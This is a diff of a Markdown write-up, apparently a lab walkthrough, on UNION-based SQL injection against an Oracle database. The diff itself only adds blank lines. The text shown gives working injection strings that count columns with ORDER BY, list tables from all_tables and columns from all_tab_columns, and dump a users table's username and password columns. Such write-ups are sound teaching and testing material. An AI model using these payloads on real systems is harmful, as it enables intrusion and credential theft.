@@ -23,6 +23,7 @@ As we all know for a  `UNION`  query to work, two key requirements must be met:
 
 _The individual queries must return the same number of columns._
 _The data types in each column must be compatible between the individual queries._
+
 Determining __number of columns present in the database table.__ Here we will use `ORDER BY` clause. After invoking `' ORDER BY 3#` we got `Internal Server Error`. That means this database has two columns.
 
 ![poc_orcle_db_num_of_column.png](../images/orcle_db_num_of_column.png)
@@ -40,6 +41,7 @@ At first enumerate table name using `all_tables`. `' UNION SELECT table_name,NUL
 ![poc_oracle_db_table_name.png](../images/oracle_db_table_name.png)
 
  Now find out the number of columns in table `USERS_HCVAFF`. `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_HCVAFF'--` helps us with this.
+ 
  ![poc_oracle_db_column_name.png](../images/oracle_db_column_name.png)
 
  And at last enumerate the content in these two columns. `' UNION SELECT USERNAME_UDFHCA, PASSWORD_VHAXCV FROM USERS_HCVAFF--` helps us with this.
